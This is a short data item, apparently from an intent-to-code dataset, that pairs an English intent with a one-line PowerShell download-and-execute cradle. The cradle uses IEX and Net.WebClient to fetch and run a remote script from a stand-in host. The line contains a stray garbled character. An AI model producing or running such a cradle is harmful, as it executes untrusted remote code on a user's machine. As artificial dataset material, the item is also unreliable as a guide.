# Natural language intent:
# Download and execute PowerShell code from a potentially malicious website.

Invoke-Expression -Command ï¿½ IEX (New-Object Net.WebClient).DownloadString('http://dangerExample.com/Kern132.ps1')
